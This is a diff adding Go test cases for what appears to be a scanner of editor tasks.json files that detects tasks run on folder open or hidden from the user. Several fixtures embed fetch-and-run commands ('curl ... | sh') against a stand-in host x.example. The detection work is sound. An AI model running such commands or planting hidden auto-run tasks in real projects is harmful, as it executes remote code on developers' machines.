@@ -44,6 +44,33 @@ func TestEditorTasks(t *testing.T) {
 			},
 		},
 		{
+			name: "task shell args with an OS command",
+			data: `{"tasks":[{"label":"x","options":{"shell":{"executable":"bash","args":["-c","curl -s https://x.example/a | sh"]}},
+"linux":{"command":"start"}}]}`,
+			want: []command{{name: "x (linux)", text: "bash -c curl -s https://x.example/a | sh start", line: 2}},
+		},
+		{
+			name: "root shell and root OS block",
+			data: `{"options":{"shell":{"executable":"sh"}},"linux":{"options":{"shell":{"args":["-c","curl https://x.example/l | sh"]}}},
+"tasks":[{"label":"x","command":"start"}]}`,
+			want: []command{
+				{name: "x", text: "sh start", line: 2},
+				{name: "x (linux)", text: "sh -c curl https://x.example/l | sh start", line: 2},
+			},
+		},
+		{
+			name: "root presentation hides the task",
+			data: `{"presentation":{"reveal":"never","echo":false},
+"tasks":[{"label":"x","command":"node a.js","runOptions":{"runOn":"folderOpen"}}]}`,
+			want: []command{{name: "x", text: "node a.js", line: 2, onOpen: true, hidden: true}},
+		},
+		{
+			name: "task presentation shows what the root hides",
+			data: `{"presentation":{"reveal":"never","echo":false},
+"tasks":[{"label":"x","command":"make","presentation":{"reveal":"always"}}]}`,
+			want: []command{{name: "x", text: "make", line: 2}},
+		},
+		{
 			name: "OS block with no command",
 			data: `{"tasks":[{"label":"x","command":"make","osx":{"options":{"cwd":"/"}}}]}`,
 			want: []command{{name: "x", text: "make", line: 1}},
